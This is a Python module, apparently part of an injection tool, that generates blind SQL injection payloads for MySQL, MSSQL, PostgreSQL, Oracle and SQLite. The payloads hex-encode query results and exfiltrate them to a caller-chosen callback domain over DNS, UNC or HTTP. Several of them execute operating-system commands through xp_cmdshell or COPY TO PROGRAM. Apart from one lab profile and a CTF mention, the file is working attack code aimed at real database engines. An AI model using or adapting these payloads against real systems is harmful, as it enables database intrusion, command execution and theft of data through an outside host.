from dataclasses import dataclass


@dataclass(frozen=True)
class Profile:
    name: str
    description: str
    comment: str

    def substring(self, expression: str, pos: int) -> str:
        if self.name in ("mssql", "mssql-cmdshell"):
            return f"SUBSTRING(({expression}),{pos},1)"
        if self.name == "oracle-http":
            return f"SUBSTR(({expression}),{pos},1)"
        return f"substr(({expression}),{pos},1)"

    def condition(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}='{char}'"

    def condition_gte(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}>='{char}'"

    @staticmethod
    def _hex_split_sql(hex_expr: str, chunk: int = 62) -> str:
        """Return a SQL expression that splits hex_expr into dot-joined labels of ≤chunk chars.
        Supports up to 4 chunks (248 hex chars = 124 bytes)."""
        # SUBSTRING(h,1,62) || CASE WHEN LEN(h)>62 THEN '.'||SUBSTRING(h,63,62) ... END
        # We use a generic form that works for expressions returning a VARCHAR hex string.
        # Callers pass the right function name for their DBMS.
        # This helper just returns the split logic as a Python string template.
        # Not used directly — each profile implements its own split.
        return hex_expr  # fallback: no split (override per profile)

    def direct_payload(self, base: str, expression: str, prefix: str, domain: str) -> str | None:
        """Return a payload that exfiltrates the full value as HEX in one DNS hit.
        Hex is split into ≤62-char dot-separated labels to stay within DNS limits.
        Returns None if this profile does not support direct mode."""
        host = f"{prefix}.{domain}"

        if self.name in ("mysql", "mysql-stacked"):
            # MySQL: HEX() returns hex; split with LEFT/MID and IF
            h = f"HEX(({expression}))"
            split = (
                f"LEFT({h},62),"
                f"IF(LENGTH({h})>62,CONCAT('.',MID({h},63,62)),''),"
                f"IF(LENGTH({h})>124,CONCAT('.',MID({h},125,62)),''),"
                f"IF(LENGTH({h})>186,CONCAT('.',MID({h},187,62)),'')"
            )
            unc = f"CONCAT('\\\\\\\\\\\\\\\\',{split},'.{host}\\\\\\\\x')"
            if self.name == "mysql-stacked":
                return f"{base}'; SELECT LOAD_FILE({unc});-- -"
            return f"{base}' AND LOAD_FILE({unc})-- -"

        if self.name in ("mssql", "mssql-cmdshell"):
            # MSSQL: CONVERT to hex VARCHAR, split with SUBSTRING + CASE
            h = f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expression})),2)"
            split = (
                f"SUBSTRING({h},1,62)"
                f"+CASE WHEN LEN({h})>62 THEN '.'+SUBSTRING({h},63,62) ELSE '' END"
                f"+CASE WHEN LEN({h})>124 THEN '.'+SUBSTRING({h},125,62) ELSE '' END"
                f"+CASE WHEN LEN({h})>186 THEN '.'+SUBSTRING({h},187,62) ELSE '' END"
            )
            if self.name == "mssql-cmdshell":
                return f"{base}'; EXEC master..xp_cmdshell 'nslookup '+{split}+'.{host}'/*"
            return f"{base}'; EXEC master..xp_dirtree '//'+{split}+'.{host}/x'/*"

        if self.name == "postgres-dblink":
            # PostgreSQL: encode()::hex, split with substring + CASE
            h = f"encode(({expression})::bytea,'hex')"
            split = (
                f"substring({h},1,62)"
                f"||CASE WHEN length({h})>62 THEN '.'"
                f"||substring({h},63,62) ELSE '' END"
                f"||CASE WHEN length({h})>124 THEN '.'"
                f"||substring({h},125,62) ELSE '' END"
                f"||CASE WHEN length({h})>186 THEN '.'"
                f"||substring({h},187,62) ELSE '' END"
            )
            return (
                f"{base}';SELECT dblink_connect('host='||{split}||"
                f"'.{host} user=a password=a dbname=a')--"
            )

        if self.name == "postgres-program":
            esc = host.replace("'", "'\"'\"'")
            h = f"encode(({expression})::bytea,'hex')"
            split = (
                f"substring({h},1,62)"
                f"||CASE WHEN length({h})>62 THEN '.'||substring({h},63,62) ELSE '' END"
                f"||CASE WHEN length({h})>124 THEN '.'||substring({h},125,62) ELSE '' END"
                f"||CASE WHEN length({h})>186 THEN '.'||substring({h},187,62) ELSE '' END"
            )
            return (
                f"{base}';DO $$ DECLARE v TEXT; BEGIN "
                f"SELECT {split} INTO v; "
                f"EXECUTE 'COPY (SELECT 1) TO PROGRAM ''nslookup '' || v || ''.{esc}'''; "
                f"END $$;--"
            )

        if self.name == "oracle-http":
            # Oracle: RAWTOHEX, split with SUBSTR + CASE
            h = f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))"
            split = (
                f"SUBSTR({h},1,62)"
                f"||CASE WHEN LENGTH({h})>62 THEN '.'||SUBSTR({h},63,62) ELSE '' END"
                f"||CASE WHEN LENGTH({h})>124 THEN '.'||SUBSTR({h},125,62) ELSE '' END"
                f"||CASE WHEN LENGTH({h})>186 THEN '.'||SUBSTR({h},187,62) ELSE '' END"
            )
            return (
                f"{base}'||(SELECT UTL_HTTP.REQUEST('http://'||{split}||"
                f"'.{host}/') FROM dual)||'"
            )

        if self.name in ("sqlite-lab", "sqlite-http"):
            h = f"hex(({expression}))"
            split = (
                f"substr({h},1,62)"
                f"||CASE WHEN length({h})>62 THEN '.'||substr({h},63,62) ELSE '' END"
                f"||CASE WHEN length({h})>124 THEN '.'||substr({h},125,62) ELSE '' END"
                f"||CASE WHEN length({h})>186 THEN '.'||substr({h},187,62) ELSE '' END"
            )
            return f"{base}' AND dns_lookup({split}||'.{host}')-- -"

        return None

    def payload(self, base: str, condition: str, callback_host: str) -> str:
        if self.name == "sqlite-lab":
            return (
                f"{base}' AND CASE WHEN {condition} "
                f"THEN dns_lookup('{callback_host}') ELSE 0 END--"
            )
        if self.name == "mssql":
            return (
                f"{base}';IF ({condition}) "
                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'/*"
            )
        if self.name == "mysql":
            return (
                f"{base}' AND IF({condition},"
                f"LOAD_FILE('\\\\\\\\{callback_host}\\\\x'),0)-- "
            )
        if self.name == "oracle-http":
            return (
                f"{base}'||(SELECT CASE WHEN {condition} "
                f"THEN UTL_HTTP.REQUEST('http://{callback_host}/') ELSE '' END FROM dual)||'"
            )
        if self.name == "postgres-program":
            escaped = callback_host.replace("'", "'\"'\"'")
            return (
                f"{base}';DO $$ BEGIN IF ({condition}) THEN "
                f"COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'; "
                f"END IF; END $$;--"
            )
        if self.name == "postgres-dblink":
            return (
                f"{base}';SELECT CASE WHEN {condition} THEN "
                f"dblink_connect('host={callback_host} user=a password=a dbname=a') "
                f"ELSE NULL END::text--"
            )
        if self.name == "mssql-cmdshell":
            return (
                f"{base}';IF ({condition}) "
                f"EXEC master..xp_cmdshell 'nslookup {callback_host}'/*"
            )
        if self.name == "mysql-stacked":
            escaped = callback_host.replace("'", "''")
            return (
                f"{base}'; SELECT IF({condition},"
                f"LOAD_FILE('\\\\\\\\{escaped}\\\\x'),NULL);--"
            )
        if self.name == "sqlite-http":
            return (
                f"{base}' AND CASE WHEN {condition} "
                f"THEN http_get('http://{callback_host}/') ELSE 0 END--"
            )
        raise ValueError(f"unknown profile: {self.name}")


PROFILES = {
    "sqlite-lab": Profile(
        "sqlite-lab",
        "Training profile for lab/blind_sqli_lab.py using SQLite dns_lookup()",
        "Local lab only.",
    ),
    "mssql": Profile(
        "mssql",
        "MSSQL stacked query using xp_dirtree UNC DNS callbacks",
        "Requires xp_dirtree access and outbound DNS/SMB resolution.",
    ),
    "mysql": Profile(
        "mysql",
        "MySQL LOAD_FILE UNC callback, mostly useful on Windows targets",
        "Requires FILE privilege and Windows-style UNC resolution.",
    ),
    "oracle-http": Profile(
        "oracle-http",
        "Oracle UTL_HTTP callback",
        "Requires UTL_HTTP/network ACL access.",
    ),
    "postgres-program": Profile(
        "postgres-program",
        "PostgreSQL COPY TO PROGRAM callback",
        "Requires stacked queries and high privileges (usually superuser/pg_execute_server_program).",
    ),
    "postgres-dblink": Profile(
        "postgres-dblink",
        "PostgreSQL dblink extension callback — lower privilege than COPY TO PROGRAM",
        "Requires dblink extension. No superuser needed in most default Postgres installs.",
    ),
    "mssql-cmdshell": Profile(
        "mssql-cmdshell",
        "MSSQL xp_cmdshell nslookup callback — alternative when xp_dirtree is blocked",
        "Requires: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE.",
    ),
    "mysql-stacked": Profile(
        "mysql-stacked",
        "MySQL LOAD_FILE via stacked query — for multi-statement enabled targets",
        "Requires FILE privilege, stacked queries, and Windows-style UNC resolution.",
    ),
    "sqlite-http": Profile(
        "sqlite-http",
        "SQLite http_get() callback via sqlite-http/sqlean-http extension",
        "Requires the sqlite-http extension loaded. Common in some CTF challenge deployments.",
    ),
}
